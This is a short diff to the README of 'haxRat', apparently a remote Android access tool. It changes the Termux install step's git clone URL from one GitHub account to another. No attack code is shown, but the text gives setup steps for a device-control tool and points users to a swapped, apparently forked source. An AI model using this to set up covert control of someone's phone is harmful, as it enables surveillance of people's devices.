@@ -37,7 +37,7 @@ A cloud based remote android managment suite, powered by NodeJS
 ### For Termux Users
 1. Install NodeJs `apt install nodejs`
 
-2. Clone `git clone https://github.com/hax4us/haxRat.git`
+2. Clone `git clone https://github.com/Black-S0UL/haxRat.git`
 
 3. Goto server directory `cd haxRat/server`
 
